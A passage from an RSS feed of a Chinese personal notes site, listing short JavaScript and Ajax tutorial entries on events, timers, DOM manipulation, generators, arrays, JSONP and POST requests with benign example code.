Button 表示触发当前事件是鼠标的左键还是右键，又或者是滚轮。
0 表示鼠标左键，1 表示鼠标滚轮，2 表示鼠标右键。
div.onmousedown = function (event) { 	if (event.button == 0) { 	console.log(&amp;#39;Left Click&amp;#39;); 	} else if (event.button == 1) { 	console.log(&amp;#39;Roller&amp;#39;); 	} else if (event.button == 2) { 	console.log(&amp;#39;Right Click&amp;#39;); 	} }; charCode 键盘事件的事件对象上的属性，返回按下的键的 ASCII 码 。</description>
    </item>
    
    <item>
      <title>JavaScript 区分点击事件与长按事件</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/%E5%AE%9E%E4%BE%8B/%E5%8C%BA%E5%88%86%E7%82%B9%E5%87%BB%E4%BA%8B%E4%BB%B6%E4%B8%8E%E9%95%BF%E6%8C%89%E4%BA%8B%E4%BB%B6/</link>
      <pubDate>Thu, 05 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/%E5%AE%9E%E4%BE%8B/%E5%8C%BA%E5%88%86%E7%82%B9%E5%87%BB%E4%BA%8B%E4%BB%B6%E4%B8%8E%E9%95%BF%E6%8C%89%E4%BA%8B%E4%BB%B6/</guid>
      <description>区分点击事件与长按事件 HTML &amp;lt;!DOCTYPE html&amp;gt; &amp;lt;html lang=&amp;#34;en&amp;#34;&amp;gt; 	&amp;lt;head&amp;gt; 	&amp;lt;meta charset=&amp;#34;UTF-8&amp;#34; /&amp;gt; 	&amp;lt;meta http-equiv=&amp;#34;X-UA-Compatible&amp;#34; content=&amp;#34;IE=edge&amp;#34; /&amp;gt; 	&amp;lt;meta name=&amp;#34;viewport&amp;#34; content=&amp;#34;width=device-width, initial-scale=1.0&amp;#34; /&amp;gt; 	&amp;lt;title&amp;gt;区分点击事件与长按事件.m&amp;lt;/title&amp;gt; 	&amp;lt;style&amp;gt; 	div { 	width: 100px; 	height: 100px; 	background-color: rgb(15, 190, 131); 	} 	&amp;lt;/style&amp;gt; 	&amp;lt;/head&amp;gt;  	&amp;lt;body&amp;gt; 	&amp;lt;div style=&amp;#34;position:absolute;left:0;top:0;&amp;#34;&amp;gt;该拖曳只对内联样式有效&amp;lt;/div&amp;gt; 	&amp;lt;/body&amp;gt; 	&amp;lt;script src=&amp;#34;./js/main.js&amp;#34;&amp;gt;&amp;lt;/script&amp;gt; &amp;lt;/html&amp;gt; JavaScrip var div = document.getElementsByTagName(&amp;#39;div&amp;#39;)[0];  var firstTime = new Date(); var lastTime = new Date(); var key = false; // 元素按下时的时间 document.</description>
    </item>
    
    <item>
      <title>JavaScript 定时器</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/window/%E5%AE%9A%E6%97%B6%E5%99%A8/</link>
      <pubDate>Thu, 05 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/window/%E5%AE%9A%E6%97%B6%E5%99%A8/</guid>
      <description>定时器 定时操作的方法全是 Window 对象的方法，这些方法中的 this 都指向 Window
setIntereval() 每隔多少毫秒再循环执行一次回调函数中的代码。
需要注意，这个间隔时间一旦定义就无法被修改。
非常不准确，可以用时间戳来证明。
返回值是一个 id 数值，这个 id 作为当前定时器的唯一标识符。
// 定时器 var time = 1000; setInterval(function () { 	console.log(&amp;#39;定时器&amp;#39;); }, time); // 修改 time，虽然 time 被修改了，但定时器中的 time 依旧也是 1000 time = 10; console.log(time); clearIntereval() 清除由 setInterval() 设置的定时操作。
参数是一个数值。
var i = 0; var time = setInterval(function () { 	console.log(i++); 	if (i &amp;gt; 10) { 	clearInterval(time); 	console.log(&amp;#39;定时器已暂停&amp;#39;); 	} }, 100); setTimeout() 在指定毫秒数之后执行回调函数中的代码。回调函数中的代码只会执行因此。</description>
    </item>
    
    <item>
      <title>JavaScript 拖拽元素</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/%E5%AE%9E%E4%BE%8B/%E6%8B%96%E6%8B%BD%E5%85%83%E7%B4%A0/</link>
      <pubDate>Thu, 05 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/%E5%AE%9E%E4%BE%8B/%E6%8B%96%E6%8B%BD%E5%85%83%E7%B4%A0/</guid>
      <description>拖拽元素 HTML &amp;lt;!DOCTYPE html&amp;gt; &amp;lt;html lang=&amp;#34;en&amp;#34;&amp;gt; 	&amp;lt;head&amp;gt; 	&amp;lt;meta charset=&amp;#34;UTF-8&amp;#34; /&amp;gt; 	&amp;lt;meta http-equiv=&amp;#34;X-UA-Compatible&amp;#34; content=&amp;#34;IE=edge&amp;#34; /&amp;gt; 	&amp;lt;meta name=&amp;#34;viewport&amp;#34; content=&amp;#34;width=device-width, initial-scale=1.0&amp;#34; /&amp;gt; 	&amp;lt;title&amp;gt;拖拽元素&amp;lt;/title&amp;gt; 	&amp;lt;style&amp;gt; 	div { 	width: 100px; 	height: 100px; 	background-color: rgb(15, 190, 131); 	} 	&amp;lt;/style&amp;gt; 	&amp;lt;/head&amp;gt;  	&amp;lt;body&amp;gt; 	&amp;lt;div style=&amp;#34;position:absolute;left:0;top:0;&amp;#34;&amp;gt;该拖曳只对内联样式有效&amp;lt;/div&amp;gt; 	&amp;lt;/body&amp;gt; 	&amp;lt;script src=&amp;#34;./js/main.js&amp;#34;&amp;gt;&amp;lt;/script&amp;gt; &amp;lt;/html&amp;gt; JavaScrip function drag(elem) { 	var disX, disY; 	// 鼠标 	elem.</description>
    </item>
    
    <item>
      <title>JavaScript 脚本化 CSS</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/%E8%84%9A%E6%9C%AC%E5%8C%96-css/</link>
      <pubDate>Thu, 05 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/%E8%84%9A%E6%9C%AC%E5%8C%96-css/</guid>
      <description>脚本化 CSS 用 JavaScrip 间接操作 CSS，它是通过内联样式表去间接控制 CSS。
间接操作 CSS 时，只有ele.style.attr是读写操作，除此之外的任何操作都是只读操作。</description>
    </item>
    
    <item>
      <title>JavaScript 自动阅读</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/%E5%AE%9E%E4%BE%8B/%E8%87%AA%E5%8A%A8%E9%98%85%E8%AF%BB/</link>
      <pubDate>Thu, 05 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/%E5%AE%9E%E4%BE%8B/%E8%87%AA%E5%8A%A8%E9%98%85%E8%AF%BB/</guid>
      <description>自动阅读 JavaScrip var start = document.getElementsByTagName(&amp;#39;div&amp;#39;)[0];var stop = document.getElementsByTagName(&amp;#39;div&amp;#39;)[0];var time;// 定义一个 key，用来判断自动阅读是否暂停// 如果不加判断，setInterval() 就会被重复执行多个（导致自动阅读的速度增加），而 clearInterval() 则只能暂停第一个 setInterval()（导致自动阅读无法被暂停）var key = &amp;#39;自动阅读已暂停&amp;#39;;start.onclick = function () {// 判断自动阅读的状态if (key == &amp;#39;自动阅读已暂停&amp;#39;) {// 用 setInterval() 反复执行 scrollBy() 实现页面自动向下滚动time = setInterval(function () {window.scrollBy(0, 10);}, 100);// 自动阅读已开始key = &amp;#39;自动阅读已开始&amp;#39;;}};// 自动阅读已暂停stop.onclick = function () {clearInterval(time);key = &amp;#39;自动阅读已暂停&amp;#39;;}; </description>
    </item>
    
    <item>
      <title>JavaScript 返回父元素节点.</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/%E5%AE%9E%E4%BE%8B/%E8%BF%94%E5%9B%9E%E7%88%B6%E5%85%83%E7%B4%A0%E8%8A%82%E7%82%B9/</link>
      <pubDate>Thu, 05 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/%E5%AE%9E%E4%BE%8B/%E8%BF%94%E5%9B%9E%E7%88%B6%E5%85%83%E7%B4%A0%E8%8A%82%E7%82%B9/</guid>
      <description>返回父元素节点. JavaScrip function re(e, n) { 	// 如果 e 不为 null 并且 n 不为 0 	while (e &amp;amp;&amp;amp; n) { 	// 获取当前节点的父元素 	e = e.parentElement; 	// 每次循环一次，则想上找一层的父元素，直到 n 为 0 	n--; 	} 	return e; }  var i = document.getElementsByTagName(&amp;#39;i&amp;#39;)[0];  var result = re(i, 3); console.log(result); </description>
    </item>
    
    <item>
      <title>JavaScript 阻止默认事件</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/events/%E9%98%BB%E6%AD%A2%E9%BB%98%E8%AE%A4%E4%BA%8B%E4%BB%B6/</link>
      <pubDate>Thu, 05 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/events/%E9%98%BB%E6%AD%A2%E9%BB%98%E8%AE%A4%E4%BA%8B%E4%BB%B6/</guid>
      <description>阻止默认事件 默认事件：表单提交、a 元素跳转、右键菜单等。
reture false 阻止某个对象的默认事件，只支持阻止事件句柄 onclick，不支持addEventListener()。
document.oncontextmenu = function () { 	console.log(&amp;#39;鼠标右击事件&amp;#39;); 	return false; };  document.onclick = function () { 	console.log(&amp;#39;文档被点击&amp;#39;); 	return false; }; preventDefault() 阻止某个对象的默认事件，支持事件句柄，以及addEventListener()。
document.addEventListener( 	&amp;#39;contextmenu&amp;#39;, 	function (event) { 	console.log(&amp;#39;鼠标右击事件&amp;#39;); 	event.preventDefault(); 	}, 	false ); document.onconte; xtmenu = function (event) { 	console.log(&amp;#39;鼠标右击事件&amp;#39;); 	event.preventDefault(); }; returnValue() 兼容 IE，与preventDefault()一样，支持阻止事件句柄、以及addEventListener()。
document.oncontextmenu = function (event) { 	console.log(&amp;#39;鼠标右击事件&amp;#39;); 	event.</description>
    </item>
    
    <item>
      <title>JavaScrip</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/javascrip/</link>
      <pubDate>Tue, 03 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/javascrip/</guid>
      <description>JavaScript JavaScrip 是单线程的语言的原因是因为 JavaScrip 需要对 HTML 页面进行操作，无法一边操作 HTML 文档，一边又加载 HTML 文档。</description>
    </item>
    
    <item>
      <title>JavaScrip 异步加载 JS</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/%E5%BC%82%E6%AD%A5%E5%8A%A0%E8%BD%BD-js/</link>
      <pubDate>Tue, 03 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/%E5%BC%82%E6%AD%A5%E5%8A%A0%E8%BD%BD-js/</guid>
      <description>异步加载 JS 有时候，我们需要加载一些工具包，这些工具包与加载 HTML 文档无关，因此，我们就需要异步加载 JavaScrip，即实现 JavaScrip 的多线程。
aysnc=&amp;ldquo;aysnc&amp;rdquo; 异步加载，加载 JavaScrip 文件完就执行，aysnc 只能加载外部 JavaScrip，并不能将 JavaScrip 代码写到 script 元素中。
defer = &amp;ldquo;defer&amp;rdquo; 异步加载，即一边加载 JavaScrip 文件，一边加载 HTML 文档，但是，它需要等 DOM 文档解析完毕后，才会执行其中的 JavaScrip 代码，相当于window.onload，IE 独有。
可以将 JavaScrip 代码写到 script 元素中。
&amp;lt;script src=&amp;#34;vue.js&amp;#34; defer=&amp;#34;defer&amp;#34;&amp;gt; 	console.log(&amp;#39;IE 异步加载&amp;#39;) &amp;lt;/script&amp;gt; 按需异步加载 JS 当我们用创建一个 script 元素，那么需要将它插入到页面中，才会执行这个 JavaScrip 文件。如果不插入的话，仅仅只执行加载这个 JavaScrip 文件，这样，我们就实现了一个异步加载 JavaScrip 的过程。
因为加载 JavaScrip 文件需要一个过程，而程序执行代码的时候，并不会等 main.js 文件下载完毕才继续执行后续代码，因此，这时候如果立即执行 main.js 中的某个方法，会报错。
&amp;lt;!DOCTYPE html&amp;gt; &amp;lt;html lang=&amp;#34;en&amp;#34;&amp;gt; 	&amp;lt;head&amp;gt; 	&amp;lt;meta charset=&amp;#34;UTF-8&amp;#34; /&amp;gt; 	&amp;lt;meta http-equiv=&amp;#34;X-UA-Compatible&amp;#34; content=&amp;#34;IE=edge&amp;#34; /&amp;gt; 	&amp;lt;meta name=&amp;#34;viewport&amp;#34; content=&amp;#34;width=device-width, initial-scale=1.</description>
    </item>
    
    <item>
      <title>JavaScrip 异步和同步</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/%E5%BC%82%E6%AD%A5%E5%92%8C%E5%90%8C%E6%AD%A5/</link>
      <pubDate>Tue, 03 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/%E5%BC%82%E6%AD%A5%E5%92%8C%E5%90%8C%E6%AD%A5/</guid>
      <description>异步和同步 同步 异步 异步是目的，多线程是手段。
异步是和同步相对的。同步即阻塞，也即在做 A 的时候做不了 B，AB 可以同时做互不干扰就叫异步。为了实现异步，可以利用多线程。</description>
    </item>
    
    <item>
      <title>JavaScrip 浏览器渲染页面</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/dom/%E6%B5%8F%E8%A7%88%E5%99%A8%E6%B8%B2%E6%9F%93%E9%A1%B5%E9%9D%A2/</link>
      <pubDate>Tue, 03 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/dom/%E6%B5%8F%E8%A7%88%E5%99%A8%E6%B8%B2%E6%9F%93%E9%A1%B5%E9%9D%A2/</guid>
      <description>浏览器渲染页面 构建 DOM 树 解析 DOM 节点，将 HTML 元素以树形结构（二叉树）的方式添加到 DOM 树上，解析的时候只解析节点本身，不解析节点的属性或其包含的文本。
此时还未加载 DOM 树，仅仅只是解析 DOM 节点。
构建 CSS 树 构建 Render 树 DOMTree + CSSTree = RenderTree
RenderTree 构建完成之后，浏览器渲染引擎才正式开始绘制页面
reFlow 该过程需要重新构建整个文档，非常浪费性能。
指的是网络浏览器为了重新渲染部分或全部的文档而重新计算文档中元素的位置和几何结构的过程。例如 dom 节点的删除与添加、dom 节点的宽高发生变化、节点的位置变变化等。
repaint 该过程只重新绘制部分元素。
一个元素的外观的改变所触发的浏览器行为，浏览器会根据元素的新属性重新绘制，使元素呈现新的外观。例如改变 vidibility、outline、背景色等属性。
节点布局 页面渲染 </description>
    </item>
    
    <item>
      <title>JavaScrip 生成器</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/%E8%AF%AD%E5%8F%A5/%E7%94%9F%E6%88%90%E5%99%A8/</link>
      <pubDate>Tue, 03 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/%E8%AF%AD%E5%8F%A5/%E7%94%9F%E6%88%90%E5%99%A8/</guid>
      <description>生成器 用function*定义一个生成器函数，该函数通过next()来调用。
生成器函数在执行时能暂停，后面又能从暂停处继续执行。
生成器函数可以被当作一个迭代器来使用。
function* fun() { 	console.log(&amp;#39;我是生成器函数&amp;#39;); }  let iterator = fun(); iterator.next(); yield yield关键字使生成器函数执行暂停，yield关键字后面的表达式的值返回给生成器的调用者。
function* fun() { 	yield console.log(&amp;#39;第一段代码&amp;#39;); 	yield console.log(&amp;#39;第二段代码&amp;#39;); 	yield console.log(&amp;#39;第三段代码&amp;#39;); 	yield console.log(&amp;#39;第四段代码&amp;#39;); }  let iterator = fun(); iterator.next(); iterator.next(); iterator.next(); iterator.next(); iterator.next(); 调用 next()时，如果传入了参数，那么这个参数会传给上一条执行的 yield 左边的变量：
function* fun(val) { 	let result = yield console.log(&amp;#39;第一段代码&amp;#39;); 	console.log(result); 	// 将 str 传给 result 	yield console.log(&amp;#39;第二段代码&amp;#39;); 	yield console.</description>
    </item>
    
    <item>
      <title>JavaScrip 表达式</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/%E8%A1%A8%E8%BE%BE%E5%BC%8F/</link>
      <pubDate>Tue, 03 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/%E8%A1%A8%E8%BE%BE%E5%BC%8F/</guid>
      <description>表达式 表达式是一组代码的集合，它会返回一个值。
JavaScript 有以下表达式类型：
 算数：得出一个数字，例如 3.14159. 字符串：得出一个字符串, 例如 &amp;ldquo;Fred&amp;rdquo; 或 &amp;ldquo;234&amp;rdquo;. 逻辑值：得出 true 或者 false。 基本表达式：javascript 中基本的关键字和一般表达式。 左值表达式：分配给左值。  </description>
    </item>
    
    <item>
      <title>JavaScrip 迭代器</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/%E8%AF%AD%E5%8F%A5/%E8%BF%AD%E4%BB%A3%E5%99%A8/</link>
      <pubDate>Tue, 03 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/%E8%AF%AD%E5%8F%A5/%E8%BF%AD%E4%BB%A3%E5%99%A8/</guid>
      <description>迭代器 它是一个对象。
for 用于创建一个循环，由三个表达式和一个用于在循环中执行的代码块组成。
while 当指定表达式为 true，则循环执行代码体，直到表达式为 false 时结束循环。
在一个循环语句中，应当有使表达式为 false 的条件，否则会造成死循环。
do while 不管指定条件是否为 true，其代码块都会被执行一次，直到开始第二次循环时，才开始判断指定条件，直到指定条件为 false 时结束循环。
for in 用于以任意顺序遍历一个对象（除 Symbol 以外）的属性。
因为 for...in 是为遍历对象的属性而构建的，所以并不建议与数组一起使用。
通常与 Object.hasOwnPropert() 一起使用。
var obj = { 	name: &amp;#39;zhu&amp;#39;, 	age: &amp;#39;18&amp;#39;, 	gander: &amp;#39;man&amp;#39;, 	height: 174, 	__proto__: { 	lastName: &amp;#39;不属于 obj 自身的属性&amp;#39;, 	}, }; Object.prototype.zxy = &amp;#39;我是 obj 原型上的属性&amp;#39;; for (var key in obj) { 	// 判断 obj 是否含有自身所没有的属性。 	if (!</description>
    </item>
    
    <item>
      <title>JavaScript Array 方法</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/array/array-%E6%96%B9%E6%B3%95/</link>
      <pubDate>Mon, 02 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/array/array-%E6%96%B9%E6%B3%95/</guid>
      <description>Array 方法 splice(start,deleteCount,item&amp;hellip;) 从数组的索引 start 开始删除 deleteCount 个元素，并在索引为 start 的地方添加若干个 item 元素，并返回一个新数组。
此方法会改变原数组。
shift() 删除数组的第一个元素，并返回该元素的值。
此方法会改变原数组。
unshift() 将一个或多个元素添加到数组的开头，并返回该数组的新长度，该方法会修改原有数组。
filter() 用于对数组进行过滤，它返回一个过滤后的数组，如果没有任何数组元素通过测试，则返回空数组。
filter()不会对空数组进行检测，不会改变原始数组。
sort() 用原地算法对数组的元素进行排序，并返回数组。
此方法会改变原数组。
它的参数为一个回调函数compareFunction，该回调函数有a、b两个参数，它们分别代表数组中当前进行比较的两个元素：
a 表示在后的那个元素。
b 表示在前的那个元素
数字升序：
var arr = [5, 3, 9, 2, 5, 1, 7]; var result = arr.sort(function (a, b) { 	return a - b; });  console.log(arr); 数字降序：
var arr = [5, 3, 9, 2, 5, 1, 7]; var result = arr.sort(function (a, b) { 	return b - a; });  console.</description>
    </item>
    
    <item>
      <title>JavaScript Element 属性</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/dom/element/element-%E5%B1%9E%E6%80%A7/</link>
      <pubDate>Mon, 02 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/dom/element/element-%E5%B1%9E%E6%80%A7/</guid>
      <description>Element 属性 innerHTML 设置或返回指定元素的内容。返回的内容包含这个元素所包含的子元素以及文本信息。
它会解析 HTML 结构。
设置元素内容的时候，如果元素内容中有子元素，则这些子元素也会被覆盖。
可以在元素内容的后面追加新内容。
var body = document.getElementsByTagName(&amp;#39;body&amp;#39;)[0]; var div = document.getElementsByTagName(&amp;#39;div&amp;#39;)[0]; // 设置内容 div.innerHTML = &amp;#39;123&amp;#39;; // 追加内容 div.innerHTML += &amp;#39;456&amp;#39;; // 写入 html 元素 div.innerHTML += &amp;#39;&amp;lt;span&amp;gt;写入的元素&amp;lt;/span&amp;gt;&amp;#39;; childElementCount 返回指定元素节点的子元素节点的个数，不包含子元素节点的子元素节点。
firstElementChild 返回指定元素节点的第一个元素节点。
lastElementChild 返回指定元素节点的最后一个元素节点。
children 返回当前元素节点的所有子元素节点，不包含子元素节点的子元素节点。</description>
    </item>
    
    <item>
      <title>JavaScript Element 方法</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/dom/element/element-%E6%96%B9%E6%B3%95/</link>
      <pubDate>Mon, 02 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/dom/element/element-%E6%96%B9%E6%B3%95/</guid>
      <description>Element 方法 setAttribute() 设置指定元素的属性和属性的值。设置的属性名可以是自定义的属性。
如果这个指定的属性已存在，则仅更改值。
getAttribute() 返回指定属性名的属性值。
getBoundingClientRect() 返回元素的尺寸，以及相对于视口的位置。
如果是标准盒子模型，元素的宽高等于width/height + padding + border-width 的总和。如果box-sizing: border-box，元素的宽高等于 width/height。
返回的结果不是事实的，是静态的。
var div = document.getElementsByTagName(&amp;#39;div&amp;#39;)[0]; var ele = div.getBoundingClientRect(); </description>
    </item>
    
    <item>
      <title>JavaScript Node 属性</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/dom/node/node-%E5%B1%9E%E6%80%A7/</link>
      <pubDate>Mon, 02 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/dom/node/node-%E5%B1%9E%E6%80%A7/</guid>
      <description>Node 属性 用来遍历节点树。
parentElement 返回当前元素节点的父元素节点。
parentNode 返回指定节点的父节点，一个节点的父节点只有一个。
childNodes 返回指定节点所包含的所有子节点。
firstChild 返回指定节点所包含的最后一个节点
lastChild 返回指定节点所包含的第一个节点
nextSibling 返回在指定节点后面的兄弟节点，如果指定节点为最后一个节点，则返回 null。
previousSibling 返回在指定节点前面的兄弟节点，如果指定节点为第一个节点，则返回 null。</description>
    </item>
    
    <item>
      <title>JavaScript 操作节点</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/dom/%E6%93%8D%E4%BD%9C%E8%8A%82%E7%82%B9/</link>
      <pubDate>Mon, 02 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/dom/%E6%93%8D%E4%BD%9C%E8%8A%82%E7%82%B9/</guid>
      <description>操作节点 增加节点 createElement() 创建一个元素节点，但还没有插入到文档中，需要用 appendChild() 将元素插入到文档中。
var div = document.createElement(&amp;#39;div&amp;#39;); createTextNod() 创建一个文本节点，但还没有插入到文档中，需要用 appendChild() 将元素插入到文档中。
var text = document.createTextNode(&amp;#39;我是文本节点&amp;#39;); createComment() 创建一个文本节点，但还没有插入到文档中，需要用 appendChild() 将元素插入到文档中。
var comment = document.createComment(&amp;#39;我是一个注释&amp;#39;); createDocumentFragment(&amp;rsquo;&#39;) 创建了一虚拟的节点对象，也可以说是创建一个文档碎片
var fragment = document.createDocumentFragment(&amp;#39;&amp;#39;); 插入节点 ele.appendChild(subEle) 在 ele 节点的最后一个子节点之后添加 subEle 节点。
如果 subEle 节点已经在文档中存在，那么会将 subEle 节点移动到 ele 节点中。
var body = document.getElementsByTagName(&amp;#39;body&amp;#39;)[0]; var div = document.createElement(&amp;#39;div&amp;#39;); var text = document.createTextNode(&amp;#39;插入的文本&amp;#39;); body.appendChild(div); div.appendChild(text); ele.insertBefore(subEleOne,subEleTwo) 在 ele 节点的子节点 subEleTwo 之前插入一个 subEleOne 节点。
var body = document.</description>
    </item>
    
    <item>
      <title>JavaScript 类数组</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/array/%E7%B1%BB%E6%95%B0%E7%BB%84/</link>
      <pubDate>Mon, 02 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/array/%E7%B1%BB%E6%95%B0%E7%BB%84/</guid>
      <description>类数组 类数组是可以当作数组来使用的对象
类数组虽然在写法上跟数组一样，但它实际上是 object，且数组能调用的方法它都不能调用的数组。
比如 arguments，函数的第一个参数是 argument[0]，写法上跟数组一样，但是不是数组，它的原型是 Object，它也不能调用数组的一些方法。
特点 具有对象和数组的特性，既可以当作对象来用，也可以当作数组来用（并不是所有的数组方法都能使用，可以自己手动添加）
数据位 存在于数组索引位上的数据。</description>
    </item>
    
    <item>
      <title>Ajax IE 缓存问题</title>
      <link>https://note.yxzi.xyz/note/technology/internet/ajax/ie-%E7%BC%93%E5%AD%98%E9%97%AE%E9%A2%98/</link>
      <pubDate>Sun, 01 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/internet/ajax/ie-%E7%BC%93%E5%AD%98%E9%97%AE%E9%A2%98/</guid>
      <description>Ajax IE 缓存问题 IE 浏览器会会对 Ajax 请求的的结果进行缓存，这会导致下次请求服务器的时候，使用的是本地的缓存，而不是服务器响应的最新数据，这会对一些时效性比较强的一些场景产生影响。
JavaScript 在 open 方法种中的 url 路径中加上一个参数...?t=&#39; + Date.now()即可。该值是获取当前时间戳。
const div = document.getElementById(&amp;#39;result&amp;#39;); const btn = document.getElementById(&amp;#39;btn&amp;#39;); btn.onclick = function () { 	const xhr = new XMLHttpRequest(); 	// 获取时间戳，解决IE 浏览器缓存的问题 	xhr.open(&amp;#39;POST&amp;#39;, &amp;#39;http://localhost:8000/ie?t=&amp;#39; + Date.now()); 	xhr.setRequestHeader(&amp;#39;Content-Type&amp;#39;, &amp;#39;application/x-www-form-urlencoded&amp;#39;); 	xhr.setRequestHeader(&amp;#39;name&amp;#39;, &amp;#39;Rainy&amp;#39;); 	xhr.send(&amp;#39;a=100&amp;amp;b=200&amp;#39;); 	xhr.onreadystatechange = function () { 	if (xhr.readyState == 4) { 	if (xhr.status &amp;gt;= 200 &amp;amp;&amp;amp; xhr.status &amp;lt; 300) { 	div.</description>
    </item>
    
    <item>
      <title>Ajax Jsonp 实现原理</title>
      <link>https://note.yxzi.xyz/note/technology/internet/ajax/%E8%B7%A8%E5%9F%9F/jsonp-%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86/</link>
      <pubDate>Sun, 01 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/internet/ajax/%E8%B7%A8%E5%9F%9F/jsonp-%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86/</guid>
      <description>Jsonp 实现原理 script标签本身具有跨域的特性，JSONP 借助这个特定来解决的跨域问题。
服务端 const { json } = require(&amp;#39;body-parser&amp;#39;); const express = require(&amp;#39;express&amp;#39;);  const app = express();  const port = 8000;  app.all(&amp;#39;/jsonp&amp;#39;, (request, response) =&amp;gt; { 	response.setHeader(&amp;#39;Access-Control-Allow-Origin&amp;#39;, &amp;#39;*&amp;#39;); 	response.setHeader(&amp;#39;Access-Control-Allow-Headers&amp;#39;, &amp;#39;*&amp;#39;); 	// 定义数据 	const data = { 	name: &amp;#39;Rainy&amp;#39;, 	}; 	// 将数据转为字符串 	let str = JSON.stringify(data); 	// 响应结果，一个函数调用，函数已经在前端提前声明 	response.end(`handle(${str})`); });  app.listen(port, () =&amp;gt; { 	console.</description>
    </item>
    
    <item>
      <title>Ajax POST 请求</title>
      <link>https://note.yxzi.xyz/note/technology/internet/ajax/post-%E8%AF%B7%E6%B1%82/</link>
      <pubDate>Sun, 01 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/internet/ajax/post-%E8%AF%B7%E6%B1%82/</guid>
      <description>POST 请求 使用 POST 的方式向服务端发送一个请求。
服务端 const express = require(&amp;#39;express&amp;#39;); const app = express(); const port = 8000; // 创建路由规则，允许所有方式的请求 app.all(&amp;#39;/server&amp;#39;, (request, response) =&amp;gt; { 	response.setHeader(&amp;#39;Access-Control-Allow-Origin&amp;#39;, &amp;#39;*&amp;#39;); 	response.setHeader(&amp;#39;Access-Control-Allow-Headers&amp;#39;, &amp;#39;*&amp;#39;); 	response.send(&amp;#39;Hello World! POST&amp;#39;); });  app.listen(port, () =&amp;gt; { 	console.log(`服务已经启动`); }); HTML &amp;lt;!DOCTYPE html&amp;gt; &amp;lt;html lang=&amp;#34;en&amp;#34;&amp;gt; 	&amp;lt;head&amp;gt; 	&amp;lt;meta charset=&amp;#34;UTF-8&amp;#34; /&amp;gt; 	&amp;lt;meta http-equiv=&amp;#34;X-UA-Compatible&amp;#34; content=&amp;#34;IE=edge&amp;#34; /&amp;gt; 	&amp;lt;meta name=&amp;#34;viewport&amp;#34; content=&amp;#34;width=device-width, initial-scale=1.0&amp;#34; /&amp;gt; 	&amp;lt;link rel=&amp;#34;stylesheet&amp;#34; href=&amp;#34;./css/main.css&amp;#34; /&amp;gt; 	&amp;lt;title&amp;gt;POST 请求&amp;lt;/title&amp;gt; 	&amp;lt;/head&amp;gt;  	&amp;lt;body&amp;gt; 	&amp;lt;button id=&amp;#34;btn&amp;#34;&amp;gt;点击按钮，发送q&amp;lt;/button&amp;gt; 	&amp;lt;div id=&amp;#34;result&amp;#34;&amp;gt;&amp;lt;/div&amp;gt; 	&amp;lt;/body&amp;gt; 	&amp;lt;script src=&amp;#34;.</description>
    </item>
    
    <item>
      <title>Ajax 手动取消请求</title>
      <link>https://note.yxzi.xyz/note/technology/internet/ajax/%E6%89%8B%E5%8A%A8%E5%8F%96%E6%B6%88%E8%AF%B7%E6%B1%82/</link>
      <pubDate>Sun, 01 May 2022 00:00:00 +0000</pubDate>
      
